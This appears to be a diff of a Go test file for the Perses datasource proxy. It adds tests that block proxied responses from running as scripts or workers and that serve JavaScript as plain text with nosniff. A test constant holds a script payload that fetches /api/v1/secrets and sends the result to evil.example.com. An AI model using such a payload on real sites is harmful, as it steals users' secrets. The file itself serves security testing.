@@ -30,22 +30,30 @@ import (
 
 const maliciousPage = `<html><body><script>fetch("/api/v1/secrets").then(r => r.text()).then(t => fetch("https://evil.example.com/?" + t))</script></body></html>`
 
-// serveThroughProxy serves a request through the proxy to the given server, and returns the recorded response.
-// The callerHeaders are set on the response before proxying, like a middleware of Perses (e.g. CORS) would do.
-func serveThroughProxy(t *testing.T, serverURL string, callerHeaders http.Header) *httptest.ResponseRecorder {
+// proxiedPageURL is the URL of the requests served by the proxy in the tests.
+const proxiedPageURL = "http://perses.example.com/proxy/projects/p1/datasources/evil/page"
+
+// newTestProxy returns a proxy forwarding the requests to the path /page of the given server.
+func newTestProxy(t *testing.T, serverURL string) *Proxy {
 	t.Helper()
-	h := &Proxy{
+	return &Proxy{
 		Config: &datasourceHTTP.Config{URL: common.MustParseURL(serverURL)},
 		Path:   "/page",
 		// The test servers are listening on the loopback interface.
 		Guard: proxytest.NewLoopbackGuard(t),
 	}
-	req := httptest.NewRequest(http.MethodGet, "http://perses.example.com/proxy/projects/p1/datasources/evil/page", nil)
+}
+
+// serveThroughProxy serves a request through the proxy to the given server, and returns the recorded response.
+// The callerHeaders are set on the response before proxying, like a middleware of Perses (e.g. CORS) would do.
+func serveThroughProxy(t *testing.T, serverURL string, callerHeaders http.Header) *httptest.ResponseRecorder {
+	t.Helper()
+	req := httptest.NewRequest(http.MethodGet, proxiedPageURL, nil)
 	rec := httptest.NewRecorder()
 	for name, values := range callerHeaders {
 		rec.Header()[name] = values
 	}
-	require.NoError(t, h.Serve(echo.New().NewContext(req, rec)))
+	require.NoError(t, newTestProxy(t, serverURL).Serve(echo.New().NewContext(req, rec)))
 	return rec
 }
 
@@ -99,6 +107,94 @@ func TestHTTPProxy_serve_secureResponse(t *testing.T) {
 		"Access-Control-Expose-Headers",
 	} {
 		assert.Empty(t, rec.Header().Values(name), name)
+	}
+}
+
+// TestHTTPProxy_serve_scriptDestination ensures the response of a datasource cannot be loaded as a script, which the
+// Content-Security-Policy of the UI would run, as it allows the scripts of the Perses origin ('self').
+func TestHTTPProxy_serve_scriptDestination(t *testing.T) {
+	called := false
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		called = true
+		w.Header().Set("Content-Type", "text/javascript")
+		_, _ = w.Write([]byte(`fetch("/api/v1/secrets")`))
+	}))
+	defer server.Close()
+
+	for _, test := range []struct {
+		destination string
+		forbidden   bool
+	}{
+		// fetch / XHR (the UI and the plugins), the browsers that don't send the header, and the documents (sandboxed).
+		{destination: ""},
+		{destination: "empty"},
+		{destination: "document"},
+		{destination: "iframe"},
+		{destination: "script", forbidden: true},
+		{destination: "worker", forbidden: true},
+		{destination: "sharedworker", forbidden: true},
+		{destination: "serviceworker", forbidden: true},
+		{destination: "audioworklet", forbidden: true},
+		{destination: "paintworklet", forbidden: true},
+	} {
+		t.Run(fmt.Sprintf("Sec-Fetch-Dest %q", test.destination), func(t *testing.T) {
+			called = false
+			req := httptest.NewRequest(http.MethodGet, proxiedPageURL, nil)
+			if len(test.destination) > 0 {
+				req.Header.Set("Sec-Fetch-Dest", test.destination)
+			}
+			rec := httptest.NewRecorder()
+			err := newTestProxy(t, server.URL).Serve(echo.New().NewContext(req, rec))
+			if test.forbidden {
+				proxytest.RequireHTTPError(t, err, http.StatusForbidden)
+				assert.False(t, called, "the datasource must not be queried")
+				return
+			}
+			require.NoError(t, err)
+			assert.Equal(t, http.StatusOK, rec.Code)
+			assert.True(t, called, "the datasource must be queried")
+		})
+	}
+}
+
+// TestHTTPProxy_serve_secureResponse_javaScript ensures a JavaScript response of a datasource cannot run as a script of
+// the Perses origin, even in a browser that doesn't send Sec-Fetch-Dest: it's served as plain text, which the browsers
+// refuse to run with "nosniff".
+func TestHTTPProxy_serve_secureResponse_javaScript(t *testing.T) {
+	var contentTypes []string
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		for _, contentType := range contentTypes {
+			w.Header().Add("Content-Type", contentType)
+		}
+		w.WriteHeader(http.StatusOK)
+		_, _ = w.Write([]byte(`fetch("/api/v1/secrets")`))
+	}))
+	defer server.Close()
+
+	for _, test := range []struct {
+		contentTypes []string
+		expected     []string
+	}{
+		{contentTypes: []string{"text/javascript"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{"application/javascript; charset=utf-8"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{" Text/JavaScript ;charset=utf-8"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{"application/x-javascript"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{"text/ecmascript"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{"text/javascript1.5"}, expected: []string{"text/plain"}},
+		// The browsers read the values of the header as a comma-separated list.
+		{contentTypes: []string{"text/plain, text/javascript"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{"application/json", "text/javascript"}, expected: []string{"text/plain"}},
+		{contentTypes: []string{"application/json"}, expected: []string{"application/json"}},
+		{contentTypes: []string{"text/html; charset=utf-8"}, expected: []string{"text/html; charset=utf-8"}},
+		{contentTypes: []string{"text/javascripts"}, expected: []string{"text/javascripts"}},
+	} {
+		t.Run(strings.Join(test.contentTypes, " + "), func(t *testing.T) {
+			contentTypes = test.contentTypes
+			rec := serveThroughProxy(t, server.URL, nil)
+			assert.Equal(t, http.StatusOK, rec.Code)
+			assert.Equal(t, test.expected, rec.Header().Values("Content-Type"))
+			assert.Equal(t, []string{"nosniff"}, rec.Header().Values("X-Content-Type-Options"))
+		})
 	}
 }
 
